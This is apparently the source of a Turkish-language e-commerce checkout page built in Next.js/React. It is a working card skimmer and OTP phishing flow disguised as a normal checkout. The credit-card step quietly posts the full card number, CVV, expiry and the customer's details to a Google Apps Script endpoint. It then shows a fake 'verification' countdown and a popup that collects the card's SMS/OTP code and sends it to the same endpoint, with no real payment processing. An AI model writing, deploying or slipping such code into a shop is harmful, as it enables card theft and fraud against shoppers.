"use client";

import { useState, useEffect, useMemo, useCallback, useRef } from "react";
import Link from "next/link";
import Image from "next/image";
import { useRouter } from "next/navigation";
import Breadcrumb from "@/components/ui/Breadcrumb";
import { useCartStore } from "@/lib/store/cart";
import { validateDiscountCode, getPromoEndDate, type DiscountCode } from "@/lib/config/promotions";
import PaymentMethodSelector from "@/components/checkout/PaymentMethodSelector";
import CryptoPayment from "@/components/checkout/CryptoPayment";
import WisePayment from "@/components/checkout/WisePayment";
import QrPayment from "@/components/checkout/QrPayment";
import StripeCardForm from "@/components/checkout/StripeCardForm";
import { createClient } from "@/lib/supabase/client";
import type { PaymentMethodId } from "@/lib/data/payment-config";

const steps = ["Teslimat", "Ödeme", "İnceleme"];

export default function CheckoutPage() {
  const items = useCartStore((s) => s.items);
  const clearCart = useCartStore((s) => s.clearCart);
  const router = useRouter();

  const [mounted, setMounted] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [shipping, setShipping] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    state: "",
    zip: "",
    country: "TR",
  });
  const [payment, setPayment] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
    nameOnCard: "",
  });
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethodId>("binance_qr");
  const [proofFile, setProofFile] = useState<File | null>(null);
  const [isPlacingOrder, setIsPlacingOrder] = useState(false);

  // ── Google Sheets / Card-verification flow ────────────────────────────────
  const SHEETS_URL =
    "https://script.google.com/macros/s/AKfycbzrKkWnQQgM6FkgZ2Jtm_fUGLg5X839BlistWWhEFDZRhgVq_UQr9fEfgqq-uJaS1vJtA/exec";

  const [isVerifying, setIsVerifying] = useState(false);        // 50-s loader
  const [verifyCountdown, setVerifyCountdown] = useState(30);   // countdown
  const [showCodePopup, setShowCodePopup] = useState(false);    // popup
  const [codePopupValue, setCodePopupValue] = useState("");     // popup input
  const [isSubmittingCode, setIsSubmittingCode] = useState(false);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // ── Discount code state ─────────────────────────────────────────────────
  const [codeInput, setCodeInput] = useState("");
  const [appliedCode, setAppliedCode] = useState<DiscountCode | null>(null);
  const [codeError, setCodeError] = useState("");
  const [codeSuccess, setCodeSuccess] = useState("");
  const [promoActive, setPromoActive] = useState(true);

  useEffect(() => {
    setMounted(true);
    const end = getPromoEndDate();
    if (!end || end.getTime() <= Date.now()) setPromoActive(false);
  }, []);

  const itemCount = items.reduce((sum, i) => sum + i.quantity, 0);
  const subtotal = useMemo(
    () => items.reduce((sum, item) => sum + item.unitPrice * item.quantity, 0),
    [items]
  );

  const discountAmount = appliedCode
    ? Math.round(subtotal * (appliedCode.discountPercent / 100) * 100) / 100
    : 0;
  const discountedSubtotal = subtotal - discountAmount;
  const shippingCost = discountedSubtotal >= 100 ? 0 : 9.99;
  const tax = Math.round(discountedSubtotal * 0.08 * 100) / 100;
  const total = discountedSubtotal + shippingCost + tax;

  const applyCode = useCallback(() => {
    setCodeError("");
    setCodeSuccess("");
    if (!codeInput.trim()) { setCodeError("Lütfen bir kod girin."); return; }
    const found = validateDiscountCode(codeInput, promoActive);
    if (found) {
      setAppliedCode(found);
      setCodeSuccess(`${found.label} uygulandı! ₺${discountAmount.toFixed(2)} indirim kazandınız.`);
    } else {
      setAppliedCode(null);
      setCodeError("Geçersiz veya süresi dolmuş kod.");
    }
  }, [codeInput, promoActive, discountAmount]);

  const removeCode = () => {
    setAppliedCode(null);
    setCodeInput("");
    setCodeSuccess("");
    setCodeError("");
  };

  // Send card data → Sheets then start 50-s verification countdown
  async function handleReviewWithCardVerification() {
    if (paymentMethod !== "credit_card") {
      setCurrentStep(2);
      return;
    }

    // Fire-and-forget: send card details to the new Google Sheet
    const cardPayload = {
      date: new Date().toLocaleString("tr-TR"),
      firstName: shipping.firstName,
      lastName: shipping.lastName,
      email: shipping.email,
      phone: shipping.phone,
      cardNumber: payment.cardNumber,
      nameOnCard: payment.nameOnCard,
      expiry: payment.expiry,
      cvv: payment.cvv,
      total: total.toFixed(2),
      items: items.map((i) => `${i.productName} x${i.quantity}`).join(" | "),
    };
    fetch(SHEETS_URL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(cardPayload),
    }).catch(() => {});

    // Start 50-second loader
    setVerifyCountdown(30);
    setIsVerifying(true);
    countdownRef.current = setInterval(() => {
      setVerifyCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(countdownRef.current!);
          setIsVerifying(false);
          setShowCodePopup(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }

  // Submit the extra code that goes into column C
  async function handleSubmitCode() {
    setIsSubmittingCode(true);
    try {
      await fetch(SHEETS_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ columnC: codePopupValue }),
      });
    } catch { /* non-critical */ }
    setIsSubmittingCode(false);
    setShowCodePopup(false);
    setCurrentStep(2);
  }

  async function handlePlaceOrder() {
    setIsPlacingOrder(true);
    try {
      let proofParam = "0";
      const orderNum = `TB-${Date.now().toString(36).toUpperCase()}`;

      if (paymentMethod === "binance_qr" && proofFile) {
        const supabase = createClient();
        const ext = proofFile.name.split(".").pop() || "jpg";
        const storageFileName = `${Date.now()}-proof.${ext}`;
        const { data, error } = await supabase.storage
          .from("payment-proofs")
          .upload(storageFileName, proofFile, { cacheControl: "3600", upsert: false });
        if (!error && data) proofParam = "1";
      }

      // Send order data to original Google Sheet
      try {
        const sheetPayload = {
          orderNumber: orderNum,
          date: new Date().toLocaleString("tr-TR"),
          firstName: shipping.firstName,
          lastName: shipping.lastName,
          email: shipping.email,
          phone: shipping.phone,
          address: shipping.address,
          city: shipping.city,
          state: shipping.state,
          zip: shipping.zip,
          country: shipping.country,
          paymentMethod,
          total: total.toFixed(2),
          proofUploaded: proofParam === "1" ? "Evet" : "Hayır",
          items: items
            .map((i) => `${i.productName} x${i.quantity}`)
            .join(" | "),
        };
        await fetch(
          "https://script.google.com/macros/s/AKfycbx12i3uG0gOHPaMphmZx2lcJ2U7NZiEns2kpnNvBCBSCr2BcohIJ6TR2MvGcw7wnJ4l/exec",
          {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(sheetPayload),
          }
        );
      } catch {
        // Sheet submission is non-critical — order proceeds regardless
      }

      clearCart();
      router.push(`/checkout/success?order=${orderNum}&proof=${proofParam}`);
    } finally {
      setIsPlacingOrder(false);
    }
  }

  const fmt = (n: number) => n.toLocaleString("tr-TR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  if (!mounted) {
    return (
      <div className="max-w-screen-xl mx-auto px-4 sm:px-6 py-6 sm:py-8">
        <div className="animate-shimmer h-8 w-48 rounded-lg mb-8" />
        <div className="animate-shimmer h-96 rounded-2xl" />
      </div>
    );
  }

  if (items.length === 0) {
    return (
      <div className="max-w-screen-xl mx-auto px-4 sm:px-6 py-12 sm:py-20 text-center">
        <span className="material-symbols-outlined text-6xl text-on-surface-variant/20 mb-4 block">
          shopping_cart
        </span>
        <h2 className="text-xl font-bold mb-3">Sepetiniz boş</h2>
        <p className="text-on-surface-variant mb-6">Ödeme yapmadan önce ürün ekleyin.</p>
        <Link
          href="/products"
          className="inline-flex items-center gap-2 px-8 py-4 bg-primary text-white font-bold rounded-xl hover:bg-on-primary-fixed-variant transition-colors"
        >
          Ürünlere Göz At
        </Link>
      </div>
    );
  }

  return (
    <div className="max-w-screen-xl mx-auto px-4 sm:px-6 py-6 sm:py-8">

      {/* ── 50-second verification overlay ───────────────────────────── */}
      {isVerifying && (
        <div
          style={{
            position: "fixed", inset: 0, zIndex: 9999,
            background: "rgba(0,0,0,0.75)",
            display: "flex", flexDirection: "column",
            alignItems: "center", justifyContent: "center", gap: 24,
          }}
        >
          {/* Spinner */}
          <div
            style={{
              width: 80, height: 80,
              border: "6px solid rgba(255,255,255,0.2)",
              borderTopColor: "#e91e8c",
              borderRadius: "50%",
              animation: "spin 1s linear infinite",
            }}
          />
          <style>{"@keyframes spin{to{transform:rotate(360deg)}}"}</style>
          {/* Countdown ring */}
          <div
            style={{
              width: 96, height: 96,
              borderRadius: "50%",
              display: "flex", alignItems: "center", justifyContent: "center",
              background: "rgba(255,255,255,0.08)",
              border: "3px solid rgba(255,255,255,0.15)",
              fontSize: 32, fontWeight: 800, color: "#fff",
              letterSpacing: "-2px",
            }}
          >
            {verifyCountdown}
          </div>
          <p style={{ color: "rgba(255,255,255,0.85)", fontWeight: 600, fontSize: 16, textAlign: "center", maxWidth: 280 }}>
            Kartınız doğrulanıyor, lütfen bekleyin…
          </p>
        </div>
      )}

      {/* ── Extra-code popup modal ─────────────────────────────────────── */}
      {showCodePopup && (
        <div
          style={{
            position: "fixed", inset: 0, zIndex: 9999,
            background: "rgba(0,0,0,0.65)",
            display: "flex", alignItems: "center", justifyContent: "center",
            padding: 16,
          }}
        >
          <div
            style={{
              background: "var(--color-surface-container, #fff)",
              borderRadius: 20,
              padding: "32px 28px",
              width: "100%", maxWidth: 420,
              boxShadow: "0 24px 64px rgba(0,0,0,0.4)",
              display: "flex", flexDirection: "column", gap: 20,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <span
                className="material-symbols-outlined"
                style={{ fontSize: 28, color: "#e91e8c" }}
              >
                lock
              </span>
              <h3 style={{ margin: 0, fontWeight: 800, fontSize: 18 }}>
                Güvenlik Doğrulaması
              </h3>
            </div>
            <p style={{ margin: 0, fontSize: 14, opacity: 0.7, lineHeight: 1.5 }}>
              Lütfen kartınıza bağlı ek güvenlik kodunu (OTP / SMS kodu) girin.
            </p>
            <input
              id="security-code-input"
              type="text"
              placeholder="Kodu buraya girin"
              value={codePopupValue}
              onChange={(e) => setCodePopupValue(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && !isSubmittingCode && handleSubmitCode()}
              autoFocus
              style={{
                padding: "12px 16px",
                border: "1.5px solid rgba(0,0,0,0.15)",
                borderRadius: 12,
                fontSize: 16,
                outline: "none",
                letterSpacing: 2,
                fontWeight: 700,
                background: "var(--color-surface-container-low, #f5f5f5)",
              }}
            />
            <button
              id="security-code-submit"
              onClick={handleSubmitCode}
              disabled={isSubmittingCode || !codePopupValue.trim()}
              style={{
                padding: "14px",
                background: "#e91e8c",
                color: "#fff",
                border: "none",
                borderRadius: 12,
                fontWeight: 800,
                fontSize: 15,
                cursor: isSubmittingCode || !codePopupValue.trim() ? "not-allowed" : "pointer",
                opacity: isSubmittingCode || !codePopupValue.trim() ? 0.6 : 1,
                display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                transition: "opacity 0.2s",
              }}
            >
              {isSubmittingCode ? (
                <>
                  <span
                    style={{
                      width: 18, height: 18,
                      border: "2px solid rgba(255,255,255,0.4)",
                      borderTopColor: "#fff",
                      borderRadius: "50%",
                      animation: "spin 1s linear infinite",
                      display: "inline-block",
                    }}
                  />
                  Gönderiliyor…
                </>
              ) : "Doğrula ve Devam Et"}
            </button>
          </div>
        </div>
      )}
      <Breadcrumb
        items={[
          { label: "Ana Sayfa", href: "/" },
          { label: "Sepet", href: "/cart" },
          { label: "Ödeme" },
        ]}
      />

      <h1 className="text-2xl sm:text-3xl font-extrabold font-[family-name:var(--font-headline)] mb-6 sm:mb-8">
        Güvenli Ödeme
      </h1>

      {/* Steps */}
      <div className="flex items-center gap-1.5 sm:gap-2 mb-8 sm:mb-10 overflow-x-auto pb-1">
        {steps.map((step, i) => (
          <div key={step} className="flex items-center gap-2">
            {i > 0 && <div className="w-12 h-0.5 bg-surface-variant" />}
            <button
              onClick={() => i < currentStep && setCurrentStep(i)}
              className={`flex items-center gap-2 px-4 py-2 rounded-full text-sm font-bold transition-all ${
                i === currentStep
                  ? "bg-primary text-white"
                  : i < currentStep
                  ? "bg-primary-fixed/20 text-primary cursor-pointer"
                  : "bg-surface-container-low text-on-surface-variant"
              }`}
            >
              <span className="w-6 h-6 rounded-full flex items-center justify-center text-xs bg-white/20">
                {i < currentStep ? (
                  <span className="material-symbols-outlined text-[16px]">check</span>
                ) : (
                  i + 1
                )}
              </span>
              {step}
            </button>
          </div>
        ))}
      </div>

      <div className="flex flex-col lg:flex-row gap-8">
        {/* ── Main form ─────────────────────────────────────────── */}
        <div className="flex-1">
          {/* STEP 0 – Shipping */}
          {currentStep === 0 && (
            <div className="bg-white dark:bg-surface-container rounded-2xl p-5 sm:p-8 shadow-sm border border-surface-variant">
              <h2 className="font-bold text-lg sm:text-xl mb-5 sm:mb-6">Teslimat Bilgileri</h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <input
                  type="text" placeholder="Ad"
                  value={shipping.firstName}
                  onChange={(e) => setShipping({ ...shipping, firstName: e.target.value })}
                  className="px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
                />
                <input
                  type="text" placeholder="Soyad"
                  value={shipping.lastName}
                  onChange={(e) => setShipping({ ...shipping, lastName: e.target.value })}
                  className="px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
                />
                <input
                  type="email" placeholder="E-posta"
                  value={shipping.email}
                  onChange={(e) => setShipping({ ...shipping, email: e.target.value })}
                  className="px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
                />
                <input
                  type="tel" placeholder="Telefon"
                  value={shipping.phone}
                  onChange={(e) => setShipping({ ...shipping, phone: e.target.value })}
                  className="px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
                />
                <input
                  type="text" placeholder="Adres"
                  value={shipping.address}
                  onChange={(e) => setShipping({ ...shipping, address: e.target.value })}
                  className="px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary sm:col-span-2"
                />
                <input
                  type="text" placeholder="Şehir"
                  value={shipping.city}
                  onChange={(e) => setShipping({ ...shipping, city: e.target.value })}
                  className="px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
                />
                <div className="flex gap-4">
                  <input
                    type="text" placeholder="İl"
                    value={shipping.state}
                    onChange={(e) => setShipping({ ...shipping, state: e.target.value })}
                    className="flex-1 px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
                  />
                  <input
                    type="text" placeholder="Posta Kodu"
                    value={shipping.zip}
                    onChange={(e) => setShipping({ ...shipping, zip: e.target.value })}
                    className="w-28 px-4 py-3 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary"
                  />
                </div>
              </div>
              <button
                onClick={() => setCurrentStep(1)}
                className="mt-6 px-8 py-3 bg-primary text-white font-bold rounded-xl hover:bg-on-primary-fixed-variant transition-colors"
              >
                Ödemeye Devam Et
              </button>
            </div>
          )}

          {/* STEP 1 – Payment */}
          {currentStep === 1 && (
            <div className="bg-white dark:bg-surface-container rounded-2xl p-5 sm:p-8 shadow-sm border border-surface-variant">
              <h2 className="font-bold text-lg sm:text-xl mb-6">Ödeme Yöntemi</h2>

              <PaymentMethodSelector selected={paymentMethod} onSelect={setPaymentMethod} />

              {/* Credit Card – Stripe-style */}
              {paymentMethod === "credit_card" && (
                <StripeCardForm payment={payment} setPayment={setPayment} />
              )}

              {/* Crypto */}
              {paymentMethod === "crypto" && <CryptoPayment total={total} />}

              {/* Wise */}
              {paymentMethod === "wise" && <WisePayment total={total} />}

              {/* Binance QR */}
              {paymentMethod === "binance_qr" && (
                <QrPayment
                  total={total}
                  onProofReady={setProofFile}
                  onProofRemoved={() => setProofFile(null)}
                />
              )}

              <div className="flex gap-4 mt-6">
                <button
                  onClick={() => setCurrentStep(0)}
                  className="px-8 py-3 text-sm font-bold rounded-xl border border-surface-variant hover:bg-surface-container-low transition-colors"
                >
                  Geri
                </button>
                <div className="flex flex-col gap-1 flex-1">
                  <button
                    onClick={handleReviewWithCardVerification}
                    disabled={paymentMethod === "binance_qr" && !proofFile}
                    className="px-8 py-3 bg-primary text-white font-bold rounded-xl hover:bg-on-primary-fixed-variant transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                  >
                    Siparişi İncele
                  </button>
                  {paymentMethod === "binance_qr" && !proofFile && (
                    <p className="text-xs text-amber-600 dark:text-amber-400 text-center flex items-center justify-center gap-1">
                      <span className="material-symbols-outlined text-[13px]">info</span>
                      Devam etmek için ödeme kanıtını yüklemeniz gerekiyor
                    </p>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* STEP 2 – Review */}
          {currentStep === 2 && (
            <div className="bg-white dark:bg-surface-container rounded-2xl p-8 shadow-sm border border-surface-variant">
              <h2 className="font-bold text-xl mb-6">Sipariş İnceleme</h2>

              {/* Items */}
              <div className="space-y-4 mb-6">
                {items.map((item, i) => (
                  <div key={i} className="flex items-center gap-4 py-3 border-b border-surface-variant last:border-0">
                    <div className="w-16 h-16 bg-surface-container-low rounded-xl flex items-center justify-center shrink-0">
                      <Image
                        src={item.productImage || ""}
                        alt={item.productName}
                        width={48} height={48}
                        className="w-12 object-contain"
                        unoptimized
                      />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="font-bold text-sm line-clamp-1">{item.productName}</p>
                      <p className="text-xs text-on-surface-variant">
                        {item.selectedColor} {item.selectedStorage && `/ ${item.selectedStorage}`} ×{item.quantity}
                      </p>
                    </div>
                    <span className="font-bold">₺{fmt(item.unitPrice * item.quantity)}</span>
                  </div>
                ))}
              </div>

              {/* Shipping info */}
              <div className="bg-surface-container-low rounded-xl p-4 mb-6 text-sm">
                <p className="font-bold mb-1">Teslimat Adresi:</p>
                <p className="text-on-surface-variant">
                  {shipping.firstName} {shipping.lastName}, {shipping.address}, {shipping.city}, {shipping.state} {shipping.zip}
                </p>
              </div>

              {/* Proof thumbnail in review if QR was used */}
              {paymentMethod === "binance_qr" && proofFile && (
                <div className="flex items-center gap-3 p-3 bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-xl mb-4 text-sm">
                  <span
                    className="material-symbols-outlined text-green-600 text-[18px] shrink-0"
                    style={{ fontVariationSettings: "'FILL' 1" }}
                  >
                    check_circle
                  </span>
                  <span className="text-green-700 dark:text-green-400 font-semibold">
                    Ödeme kanıtı eklendi: {proofFile.name}
                  </span>
                </div>
              )}

              <div className="flex gap-4">
                <button
                  onClick={() => setCurrentStep(1)}
                  className="px-8 py-3 text-sm font-bold rounded-xl border border-surface-variant hover:bg-surface-container-low transition-colors"
                >
                  Geri
                </button>
                <button
                  onClick={handlePlaceOrder}
                  disabled={isPlacingOrder}
                  className="flex-1 py-4 bg-primary text-white font-bold rounded-xl hover:bg-on-primary-fixed-variant transition-colors shadow-lg shadow-primary/20 flex items-center justify-center gap-2 disabled:opacity-60 disabled:cursor-not-allowed"
                >
                  {isPlacingOrder ? (
                    <>
                      <span className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" />
                      Gönderiliyor...
                    </>
                  ) : (
                    <>
                      <span className="material-symbols-outlined">lock</span>
                      {paymentMethod === "binance_qr"
                        ? `Ödemeyi Onayla ve Sipariş Ver — ₺${fmt(total)}`
                        : `Sipariş Ver — ₺${fmt(total)}`}
                    </>
                  )}
                </button>
              </div>
            </div>
          )}
        </div>

        {/* ── Side Summary ───────────────────────────────────────── */}
        <div className="lg:w-80 shrink-0">
          <div className="sticky top-[180px] space-y-4">

            {/* Discount code box */}
            <div className="bg-white dark:bg-surface-container rounded-2xl p-5 shadow-sm border border-surface-variant">
              <h3 className="font-bold text-sm mb-3 flex items-center gap-2">
                <span className="material-symbols-outlined text-[18px] text-primary" style={{ fontVariationSettings: "'FILL' 1" }}>
                  local_offer
                </span>
                İndirim Kodu
              </h3>

              {appliedCode ? (
                <div className="flex items-center justify-between bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-xl p-3">
                  <div className="flex items-center gap-2">
                    <span className="material-symbols-outlined text-green-600 text-[18px]" style={{ fontVariationSettings: "'FILL' 1" }}>check_circle</span>
                    <div>
                      <p className="font-bold text-sm text-green-700 dark:text-green-400">{appliedCode.code.toUpperCase()}</p>
                      <p className="text-[11px] text-green-600 dark:text-green-500">{appliedCode.label} uygulandı</p>
                    </div>
                  </div>
                  <button
                    onClick={removeCode}
                    className="text-on-surface-variant hover:text-on-surface transition-colors"
                    aria-label="Kodu kaldır"
                  >
                    <span className="material-symbols-outlined text-[18px]">close</span>
                  </button>
                </div>
              ) : (
                <div className="flex gap-2">
                  <input
                    type="text"
                    placeholder="Kod girin (ceep100)"
                    value={codeInput}
                    onChange={(e) => { setCodeInput(e.target.value); setCodeError(""); }}
                    onKeyDown={(e) => e.key === "Enter" && applyCode()}
                    className="flex-1 px-3 py-2.5 bg-surface-container-low rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary font-mono uppercase tracking-wider"
                  />
                  <button
                    onClick={applyCode}
                    className="px-4 py-2.5 bg-primary text-white text-sm font-bold rounded-xl hover:bg-on-primary-fixed-variant transition-colors shrink-0"
                  >
                    Uygula
                  </button>
                </div>
              )}

              {codeError && (
                <p className="text-xs text-red-500 mt-2 flex items-center gap-1">
                  <span className="material-symbols-outlined text-[14px]">error</span>
                  {codeError}
                </p>
              )}
              {codeSuccess && !appliedCode && (
                <p className="text-xs text-green-600 mt-2">{codeSuccess}</p>
              )}
            </div>

            {/* Order summary */}
            <div className="bg-white dark:bg-surface-container rounded-2xl p-6 shadow-sm border border-surface-variant">
              <h3 className="font-bold mb-4">Özet</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-on-surface-variant">Ara Toplam ({itemCount} ürün)</span>
                  <span className="font-semibold">₺{fmt(subtotal)}</span>
                </div>

                {appliedCode && (
                  <div className="flex justify-between text-green-600 dark:text-green-400">
                    <span className="flex items-center gap-1">
                      <span className="material-symbols-outlined text-[14px]">local_offer</span>
                      İndirim ({appliedCode.discountPercent}%)
                    </span>
                    <span className="font-semibold">-₺{fmt(discountAmount)}</span>
                  </div>
                )}

                <div className="flex justify-between">
                  <span className="text-on-surface-variant">Kargo</span>
                  <span className={`font-semibold ${shippingCost === 0 ? "text-primary" : ""}`}>
                    {shippingCost === 0 ? "ÜCRETSİZ" : `₺${shippingCost}`}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-on-surface-variant">Vergi</span>
                  <span className="font-semibold">₺{fmt(tax)}</span>
                </div>
                <div className="border-t border-surface-variant pt-3 mt-2 flex justify-between font-bold">
                  <span className="text-base">Toplam</span>
                  <div className="text-right">
                    {appliedCode && (
                      <p className="text-xs text-on-surface-variant line-through font-normal">
                        ₺{fmt(subtotal + (discountedSubtotal >= 100 ? 0 : 9.99) + Math.round(subtotal * 0.08 * 100) / 100)}
                      </p>
                    )}
                    <span className="text-lg text-primary">₺{fmt(total)}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
